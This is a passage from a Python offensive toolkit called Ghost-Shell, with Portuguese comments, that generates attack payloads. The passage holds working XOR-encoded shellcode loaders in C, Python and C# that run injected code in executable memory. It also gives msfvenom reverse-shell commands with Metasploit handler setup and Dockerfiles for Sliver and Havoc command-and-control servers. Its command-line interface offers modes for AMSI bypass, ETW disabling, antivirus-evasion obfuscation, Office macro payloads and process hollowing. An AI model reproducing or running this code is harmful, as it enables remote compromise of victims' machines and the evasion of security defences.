        _log("Shellcode hex invalido. Use formato: \\xfc\\xe8... ou fc e8...", "ERRO")
        return

    if arch == "auto":
        arch = "x64" if len(raw_bytes) > 150 else "x86"

    if chave is None:
        import random
        chave = random.randint(1, 254)

    encrypted = bytes([b ^ chave for b in raw_bytes])

    _log(f"Shellcode original: {len(raw_bytes)} bytes | arch: {arch} | chave XOR: 0x{chave:02x}", "INFO")
    _log(f"Shellcode cifrado:  {len(encrypted)} bytes", "INFO")

    # --- C array ---
    c_arr = ", ".join(f"0x{b:02x}" for b in encrypted)
    c_stub = f"""// Shellcode XOR encoder - By Gh0st-Bx1
// Arch: {arch} | XOR key: 0x{chave:02x} | Size: {len(encrypted)} bytes
#include <windows.h>
#include <stdio.h>

unsigned char buf[] = {{ {c_arr} }};
unsigned int buf_len = {len(encrypted)};

int main() {{
    unsigned char key = 0x{chave:02x};
    for (unsigned int i = 0; i < buf_len; i++) buf[i] ^= key;

    LPVOID mem = VirtualAlloc(NULL, buf_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return 1;
    RtlMoveMemory(mem, buf, buf_len);
    HANDLE th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    WaitForSingleObject(th, INFINITE);
    return 0;
}}
// Compilar: x86_64-w64-mingw32-gcc stub.c -o stub.exe -masm=intel -s
// Ou: cl.exe /nologo stub.c /link /OUT:stub.exe
"""

    # --- Python3 loader ---
    py_hex = "".join(f"\\x{b:02x}" for b in encrypted)
    py_stub = f"""#!/usr/bin/env python3
# Shellcode XOR loader - By Gh0st-Bx1
# Arch: {arch} | XOR key: 0x{chave:02x} | Size: {len(encrypted)} bytes
import ctypes, sys

KEY = {chave}
buf = bytearray(b"{py_hex}")
buf = bytearray([b ^ KEY for b in buf])

ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0), ctypes.c_int(len(buf)),
    ctypes.c_int(0x3000), ctypes.c_int(0x40))
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_int(ptr), buf, ctypes.c_int(len(buf)))
ht = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr),
    ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
"""

    # --- C# byte[] ---
    cs_arr = ", ".join(f"0x{b:02x}" for b in encrypted)
    cs_stub = f"""// Shellcode XOR loader C# - By Gh0st-Bx1
// Arch: {arch} | XOR key: 0x{chave:02x} | Size: {len(encrypted)} bytes
using System;
using System.Runtime.InteropServices;

class Loader {{
    [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
    [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint ms);

    static void Main() {{
        byte[] buf = new byte[] {{ {cs_arr} }};
        byte key = 0x{chave:02x};
        for (int i = 0; i < buf.Length; i++) buf[i] ^= key;
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
        Marshal.Copy(buf, 0, mem, buf.Length);
        IntPtr th = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(th, 0xFFFFFFFF);
    }}
}}
// Compilar: csc.exe /nologo Loader.cs
"""

    stubs = {"c_stub.c": c_stub, "loader.py": py_stub, "Loader.cs": cs_stub}
    for fname, content in stubs.items():
        print(f"\n{C['C']}{C['N']}  [{fname}]{C['X']}")
        print(f"{C['D']}{content.strip()}{C['X']}")

    # Salvar em arquivos
    for fname, content in stubs.items():
        try:
            with open(fname, "w") as f:
                f.write(content)
            _log(f"Salvo: {fname}", "OK")
        except Exception as e:
            _log(f"Nao foi possivel salvar {fname}: {e}", "ALERTA")

    _log(f"XOR key: 0x{chave:02x} ({chave}) - guarde esta chave!", "ALERTA")


# ==============================================================================
# Staged vs Stageless
# ==============================================================================

def mostrar_staged_vs_stageless(ip: str, porta: int):
    """Exibe tabela comparativa Staged x Stageless e comandos msfvenom para cada."""
    _secao("STAGED vs STAGELESS - GUIA DE ESCOLHA")

    print(f"""
{C['C']}{C['N']}  Staged (/) vs Stageless (//)  -  Comparativo{C['X']}

  {C['Y']}{'Criterio':<30} {'Staged (/)':^25} {'Stageless (///)':^25}{C['X']}
  {'─'*80}
  {'Tamanho do payload':<30} {'Pequeno (~300B)':^25} {'Grande (>10KB)':^25}
  {'Requer callback':<30} {'Sim (stage download)':^25} {'Nao (tudo embutido)':^25}
  {'AV evasion':<30} {'Melhor (menos bytes)':^25} {'Pior (assinatura maior)':^25}
  {'Rede detectavel':<30} {'Sim (stage transfer)':^25} {'Menos (1 conexao)':^25}
  {'Offline/air-gap':<30} {'Nao':^25} {'Sim':^25}
  {'Encoding embutido':<30} {'Apenas o stager':^25} {'Payload inteiro':^25}
  {'Uso recomendado':<30} {'Exploit com buf limite':^25} {'Evasao de EDR':^25}

{C['C']}{C['N']}  Comandos msfvenom - Linux:{C['X']}
  {C['G']}# Staged (x64 linux):{C['X']}
  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={porta} -f elf -o staged.elf
  {C['G']}# Stageless (x64 linux):{C['X']}
  msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={porta} -f elf -o stageless.elf

{C['C']}{C['N']}  Comandos msfvenom - Windows:{C['X']}
  {C['G']}# Staged (x64 win):{C['X']}
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={porta} -f exe -o staged.exe
  {C['G']}# Stageless (x64 win) + shikata_ga_nai:{C['X']}
  msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={porta} -e x64/xor_dynamic -i 5 -f exe -o stageless.exe

{C['C']}{C['N']}  Metasploit listener:{C['X']}
  {C['G']}# Para staged:{C['X']}
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST {ip}
  set LPORT {porta}
  run -j
  {C['G']}# Para stageless (mesmo handler):{C['X']}
  set PAYLOAD windows/x64/meterpreter_reverse_tcp

{C['C']}{C['N']}  Havoc C2 - Demon agent:{C['X']}
  {C['G']}# Stageless PE:{C['X']}
  Payloads -> Demon -> Indirect Syscall -> PE -> Stageless
  {C['G']}# Staged shellcode:{C['X']}
  Payloads -> Demon -> Indirect Syscall -> Shellcode -> Staged
""")


# ==============================================================================
# C2 Dockerfile Generator
# ==============================================================================

def gerar_c2_dockerfile(framework: str = "sliver"):
    """Gera Dockerfile e docker-compose para Sliver ou Havoc C2."""
    _secao(f"C2 DOCKERFILE - {framework.upper()}")

    if framework == "sliver":
        dockerfile = """# Sliver C2 - Dockerfile
# By Gh0st-Bx1 | github.com/Ghost-Bx1
# Imagem: BishopFox Sliver C2 Framework
FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y --no-install-recommends \\
    curl wget ca-certificates unzip mingw-w64 \\
    && rm -rf /var/lib/apt/lists/*

# Instala Sliver (versao mais recente)
RUN LATEST=$(curl -s https://api.github.com/repos/BishopFox/sliver/releases/latest \\
    | grep tag_name | cut -d'"' -f4) && \\
    curl -L "https://github.com/BishopFox/sliver/releases/download/${LATEST}/sliver-server_linux" \\
    -o /usr/local/bin/sliver-server && \\
    chmod +x /usr/local/bin/sliver-server

EXPOSE 443 31337 8443

WORKDIR /sliver
ENTRYPOINT ["/usr/local/bin/sliver-server"]
CMD ["daemon"]
"""

        compose = """# docker-compose.yml - Sliver C2
# By Gh0st-Bx1 | github.com/Ghost-Bx1
version: '3.8'
services:
  sliver:
    build: .
    container_name: sliver-c2
    restart: unless-stopped
    network_mode: host
    volumes:
      - ./sliver-data:/root/.sliver
      - ./loot:/root/.sliver/loot
    environment:
      - SLIVER_OPERATOR_NAME=ghost
    ports:
      - "443:443"
      - "31337:31337"
      - "8443:8443"
"""

        print(f"\n{C['C']}{C['N']}  [Dockerfile.sliver]{C['X']}")
        print(f"{C['D']}{dockerfile.strip()}{C['X']}")
        print(f"\n{C['C']}{C['N']}  [docker-compose.yml]{C['X']}")
        print(f"{C['D']}{compose.strip()}{C['X']}")

        print(f"\n{C['Y']}  Comandos de uso:{C['X']}")
        print(f"  {C['G']}docker-compose up -d --build{C['X']}")
        print(f"  {C['G']}docker exec -it sliver-c2 sliver-server{C['X']}")
        print(f"  {C['G']}# No console Sliver:{C['X']}")
        print(f"  {C['G']}generate --mtls YOUR_IP:443 --os windows --arch amd64 --format exe{C['X']}")
        print(f"  {C['G']}mtls --lhost 0.0.0.0 --lport 443{C['X']}")

        try:
            with open("Dockerfile.sliver", "w") as f:
                f.write(dockerfile)
            with open("docker-compose.sliver.yml", "w") as f:
                f.write(compose)
            _log("Salvo: Dockerfile.sliver + docker-compose.sliver.yml", "OK")
        except Exception as e:
            _log(f"Nao foi possivel salvar arquivos: {e}", "ALERTA")

    elif framework == "havoc":
        dockerfile = """# Havoc C2 - Dockerfile
# By Gh0st-Bx1 | github.com/Ghost-Bx1
FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y --no-install-recommends \\
    git cmake build-essential mingw-w64 python3 python3-dev \\
    libssl-dev libboost-all-dev qtbase5-dev qtchooser qt5-qmake \\
    qtbase5-dev-tools golang-go nasm \\
    && rm -rf /var/lib/apt/lists/*

RUN git clone https://github.com/HavocFramework/Havoc.git /havoc
WORKDIR /havoc

RUN cd teamserver && go mod tidy && go build .

EXPOSE 40056 443 80

ENTRYPOINT ["/havoc/teamserver/teamserver"]
CMD ["server", "--profile", "/havoc/profiles/havoc.yaotl"]
"""

        compose = """# docker-compose.yml - Havoc C2
# By Gh0st-Bx1 | github.com/Ghost-Bx1
version: '3.8'
services:
  havoc-ts:
    build: .
    container_name: havoc-teamserver
    restart: unless-stopped
    network_mode: host
    volumes:
      - ./havoc-data:/havoc/data
      - ./profiles:/havoc/profiles
    ports:
      - "40056:40056"
      - "443:443"
      - "80:80"
"""

        print(f"\n{C['C']}{C['N']}  [Dockerfile.havoc]{C['X']}")
        print(f"{C['D']}{dockerfile.strip()}{C['X']}")
        print(f"\n{C['C']}{C['N']}  [docker-compose.yml]{C['X']}")
        print(f"{C['D']}{compose.strip()}{C['X']}")

        print(f"\n{C['Y']}  Comandos de uso:{C['X']}")
        print(f"  {C['G']}docker-compose up -d --build{C['X']}")
        print(f"  {C['G']}# Conectar com cliente Havoc GUI:{C['X']}")
        print(f"  {C['G']}./havoc client --yaotl profiles/havoc.yaotl{C['X']}")

        try:
            with open("Dockerfile.havoc", "w") as f:
                f.write(dockerfile)
            with open("docker-compose.havoc.yml", "w") as f:
                f.write(compose)
            _log("Salvo: Dockerfile.havoc + docker-compose.havoc.yml", "OK")
        except Exception as e:
            _log(f"Nao foi possivel salvar arquivos: {e}", "ALERTA")
    else:
        _log(f"Framework desconhecido: {framework}. Use sliver ou havoc.", "ERRO")


# ==============================================================================
# CLI
# ==============================================================================

def main():
    parser = argparse.ArgumentParser(
        prog="ghost-shell",
        description="Ghost-Shell v{} - Reverse Shell & Web Shell Generator | By Gh0st-Bx1".format(VERSAO),
        formatter_class=argparse.RawTextHelpFormatter,
    )

    sub = parser.add_subparsers(dest="modo")

    # Modo GEN
    p_gen = sub.add_parser("gen", help="Gerar payload de reverse shell")
    p_gen.add_argument("-l", "--linguagem", required=True,
                       help=f"Linguagem (use 'all' para todas): bash, python3, php, perl, ruby, powershell, nc, socat, nodejs, java, golang, groovy, lua, awk, msfvenom_hint, ...")
    p_gen.add_argument("-i", "--ip", required=True, help="IP do listener (atacante)")
    p_gen.add_argument("-p", "--porta", required=True, type=int, help="Porta do listener")
    p_gen.add_argument("--encode", choices=["base64", "base64_utf16", "url", "double_url", "hex"],
                       help="Codificar payload")
    p_gen.add_argument("--estabilizar", action="store_true",
                       help="Mostrar instrucoes de estabilizacao de shell")
    p_gen.add_argument("--listener", action="store_true",
                       help="Iniciar listener nc -lvnp apos gerar payload")

    # Modo WEBSHELL
    p_web = sub.add_parser("webshell", help="Gerar web shell")
    p_web.add_argument("--tipo", choices=list(WEB_SHELLS.keys()),
                       help=f"Tipo: {', '.join(WEB_SHELLS.keys())}")
    p_web.add_argument("--senha", help="Senha para web shells com autenticacao")
    p_web.add_argument("--todos", action="store_true", help="Gerar todos os web shells")
    p_web.add_argument("--output-dir", help="Salvar shells em diretorio")

    # Modo ENCODE
    p_enc = sub.add_parser("encode", help="Codificar payload existente")
    p_enc.add_argument("--payload", required=True, help="Payload a codificar")
    p_enc.add_argument("--tipo", required=True,
                       choices=["base64", "base64_utf16", "url", "double_url", "hex"],
                       help="Tipo de codificacao")

    # Modo LIST
    sub.add_parser("list", help="Listar todos os tipos disponiveis")

    # Modo AMSI
    p_amsi = sub.add_parser("amsi", help="Gerar bypass de AMSI para PowerShell")
    p_amsi.add_argument("--tipo", choices=list(AMSI_BYPASSES.keys()),
                        default="reflection",
                        help="Tecnica: reflection (padrao), patchbyte, constrained")

    # Modo XOR
    p_xor = sub.add_parser("xor", help="Gerar payload cifrado com XOR")
    p_xor.add_argument("-i", "--ip", required=True, help="IP do listener")
    p_xor.add_argument("-p", "--porta", required=True, type=int, help="Porta do listener")
    p_xor.add_argument("-l", "--linguagem", default="python3",
                       choices=["python3", "powershell"], help="Linguagem base (padrao: python3)")
    p_xor.add_argument("--key", help="Chave XOR em texto (padrao: aleatorio)")

    # Modo OBFUSCATE
    p_obf = sub.add_parser("obfuscate", help="Ofuscar payload (evasao de AV)")
    p_obf.add_argument("--payload", required=True, help="Payload a ofuscar")
    p_obf.add_argument("--tecnica", choices=["varnames", "concat", "split"],
                       default="split", help="Tecnica de ofuscacao (padrao: split)")

    # Modo C2
    p_c2 = sub.add_parser("c2", help="Hints de comandos para frameworks C2")
    p_c2.add_argument("-i", "--ip", required=True, help="IP do listener C2")
    p_c2.add_argument("-p", "--porta", required=True, type=int, help="Porta do listener C2")

    # Modo LISTEN (Python multi-conexao)
    p_listen = sub.add_parser("listen", help="Listener Python multi-conexao")
    p_listen.add_argument("-i", "--ip", default="0.0.0.0", help="IP bind (padrao: 0.0.0.0)")
    p_listen.add_argument("-p", "--porta", required=True, type=int, help="Porta do listener")
    p_listen.add_argument("--max", type=int, default=5, help="Max conexoes simultaneas (padrao: 5)")

    # Modo MACRO
    p_macro = sub.add_parser("macro", help="Gerar macro Office/MSBuild/HTA com reverse shell")
    p_macro.add_argument("--tipo", required=True,
                         choices=list(MACRO_PAYLOADS.keys()),
                         help=f"Tipo: {', '.join(MACRO_PAYLOADS.keys())}")
    p_macro.add_argument("-i", "--ip", required=True, help="IP do listener (atacante)")
    p_macro.add_argument("-p", "--porta", required=True, type=int, help="Porta do listener")
    p_macro.add_argument("--cmd", help="Comando raw (apenas para vba_raw)")

    # Modo SHELLCODE
    p_sc = sub.add_parser("shellcode", help="XOR-encode shellcode e gerar stubs em C/Python3/C#")
    p_sc.add_argument("--hex", required=True, help="Shellcode em hex (ex: fc e8... ou \\xfc\\xe8...)")
    p_sc.add_argument("--arch", choices=["x86", "x64", "auto"], default="auto",
                      help="Arquitetura (auto detecta pelo tamanho)")
    p_sc.add_argument("--key", type=lambda x: int(x, 0), default=None,
                      help="Chave XOR 0-255 (padrao: aleatorio)")

    # Modo STAGED
    p_staged = sub.add_parser("staged", help="Tabela comparativa Staged x Stageless + comandos msfvenom")
    p_staged.add_argument("-i", "--ip", required=True, help="IP do listener")
    p_staged.add_argument("-p", "--porta", required=True, type=int, help="Porta do listener")

    # Modo C2DOCKER
    p_c2d = sub.add_parser("c2docker", help="Gerar Dockerfile para Sliver ou Havoc C2")
    p_c2d.add_argument("--framework", choices=["sliver", "havoc"], default="sliver",
                       help="Framework C2 (padrao: sliver)")

    # Modo ETW
    p_etw = sub.add_parser("etw", help="Gerar codigo para desabilitar ETW (Event Tracing for Windows)")
    p_etw.add_argument("--lang", choices=["powershell", "csharp", "cpp"], default="powershell",
                       help="Linguagem do patch (padrao: powershell)")

    # Modo LOLBAS
    p_lol = sub.add_parser("lolbas", help="Binarios nativos Windows para o objetivo dado (LOLBAS)")
    p_lol.add_argument("--objetivo", choices=list(LOLBAS_DB.keys()), default="exec",
                       help=f"Objetivo: {', '.join(LOLBAS_DB.keys())} (padrao: exec)")

    # Modo HOLLOW
    sub.add_parser("hollow", help="Gerar template C de process hollowing com shellcode injection")

    args = parser.parse_args()

    if not args.modo:
        print(BANNER)
        parser.print_help()
        sys.exit(0)

    print(BANNER)

    if args.modo == "list":
        print(f"\n{C['C']}{C['N']}  REVERSE SHELLS DISPONIVEIS:{C['X']}")
        payloads_exemplo = _gerar_payloads("IP", "PORT")
        for nome, info in payloads_exemplo.items():
            so = info.get("so", "")
            descricao = info.get("descricao", "")
            print(f"  {C['G']}{nome:20}{C['X']}  {descricao:40}  [{so}]")

        print(f"\n{C['C']}{C['N']}  WEB SHELLS DISPONIVEIS:{C['X']}")
        for nome, info in WEB_SHELLS.items():
            print(f"  {C['G']}{nome:20}{C['X']}  {info['descricao']:50}  [{info['extensao']}]")

    elif args.modo == "gen":
        payloads = _gerar_payloads(args.ip, args.porta)
        _log(f"IP: {args.ip} | Porta: {args.porta}", "INFO")
        if args.encode:
            _log(f"Encoding: {args.encode}", "INFO")

        if args.linguagem.lower() == "all":
            _log("Gerando todos os payloads:", "TITULO")
            for nome, info in payloads.items():
                _imprimir_payload(nome, info, args.ip, args.porta, args.encode)
        elif args.linguagem in payloads:
            _imprimir_payload(args.linguagem, payloads[args.linguagem],
                              args.ip, args.porta, args.encode)
        else:
            _log(f"Linguagem '{args.linguagem}' nao encontrada. Use 'list' para ver opcoes.", "ERRO")
            sys.exit(1)

        if args.estabilizar:
            _instrucoes_estabilizacao()

        print(f"\n{C['Y']}  [!] Inicie o listener antes de executar o payload:{C['X']}")
        print(f"  {C['G']}nc -lvnp {args.porta}{C['X']}")
        print(f"  {C['G']}rlwrap nc -lvnp {args.porta}  # com historico de comandos{C['X']}\n")

        if args.listener:
            iniciar_listener("0.0.0.0", args.porta)

    elif args.modo == "webshell":
        if args.todos:
            _log("Gerando todos os web shells:", "TITULO")
            for tipo in WEB_SHELLS:
                gerar_webshell(tipo, args.senha)
                if args.output_dir:
                    ext = WEB_SHELLS[tipo]["extensao"]
                    caminho = os.path.join(args.output_dir, f"shell_{tipo}{ext}")
                    template = WEB_SHELLS[tipo]["template"]
                    os.makedirs(args.output_dir, exist_ok=True)
                    with open(caminho, "w") as f:
                        f.write(template)
                    _log(f"Salvo: {caminho}", "OK")
        elif args.tipo:
            gerar_webshell(args.tipo, args.senha)
            if args.output_dir:
                ext = WEB_SHELLS[args.tipo]["extensao"]
                caminho = os.path.join(args.output_dir, f"shell{ext}")
                template = WEB_SHELLS[args.tipo]["template"]
                os.makedirs(args.output_dir, exist_ok=True)
                with open(caminho, "w") as f:
                    f.write(template)
                _log(f"Salvo: {caminho}", "OK")
        else:
            _log("Use --tipo para especificar o tipo ou --todos", "ERRO")

    elif args.modo == "encode":
        resultado = _codificar(args.payload, args.tipo)
        print(f"\n{C['Y']}  Original:{C['X']}")
        print(f"  {C['D']}{args.payload}{C['X']}")
        print(f"\n{C['G']}  {args.tipo.upper()}:{C['X']}")
        print(f"  {C['G']}{resultado}{C['X']}\n")

        if args.tipo == "base64":
            print(f"\n{C['C']}  Para decodificar:{C['X']}")
            print(f"  echo '{resultado}' | base64 -d")

    elif args.modo == "amsi":
        gerar_amsi_bypass(args.tipo)

    elif args.modo == "xor":
        gerar_xor_shell(args.ip, args.porta, chave=args.key, linguagem=args.linguagem)

    elif args.modo == "obfuscate":
        ofuscar_payload(args.payload, tecnica=args.tecnica)

    elif args.modo == "c2":
        mostrar_c2_hints(args.ip, args.porta)

    elif args.modo == "listen":
        iniciar_listener_multi(args.ip, args.porta, max_conexoes=args.max)

    elif args.modo == "macro":
        gerar_macro(args.tipo, args.ip, args.porta, raw_cmd=args.cmd)

    elif args.modo == "shellcode":
        gerar_shellcode_encoder(args.hex, arch=args.arch, chave=args.key)

    elif args.modo == "staged":
        mostrar_staged_vs_stageless(args.ip, args.porta)

    elif args.modo == "c2docker":
        gerar_c2_dockerfile(framework=args.framework)

    elif args.modo == "etw":
        gerar_etw_patch(linguagem=args.lang)

    elif args.modo == "lolbas":
        mostrar_lolbas(objetivo=args.objetivo)

    elif args.modo == "hollow":
        gerar_process_hollow()

    print(f"\n  {C['G']}{C['N']}[+] Ghost-Shell finalizado.{C['X']}\n")


if __name__ == "__main__":
    main()

